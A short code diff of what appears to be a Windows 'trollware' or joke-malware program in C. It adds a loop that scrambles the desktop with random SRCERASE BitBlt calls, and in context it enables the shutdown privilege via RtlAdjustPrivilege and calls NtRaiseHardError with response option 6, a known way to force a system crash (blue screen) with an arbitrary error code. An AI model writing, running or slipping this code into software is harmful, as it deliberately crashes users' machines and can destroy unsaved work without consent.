@@ -203,6 +203,11 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         Sleep(100);
     }
 
+    fori(50) {
+        BitBlt(desk, i, i, sw, h, desk, rand() % 694, rand() % 114, SRCERASE);
+        Sleep(50);
+    }
+
     ReleaseDC(NULL, desk);
     CloseHandle(hmsg1);
     CloseHandle(hmsg2);
@@ -218,7 +223,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     BOOLEAN bOld2;
     ULONG ulResponse;
     RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
-    NtRaiseHardError(0x69420FFF, NULL, NULL, NULL, 6, &ulResponse);
+    NtRaiseHardError(0xDEADDEAD, NULL, NULL, NULL, 6, &ulResponse);
     FreeLibrary(ntdll);
     return 0;
 }
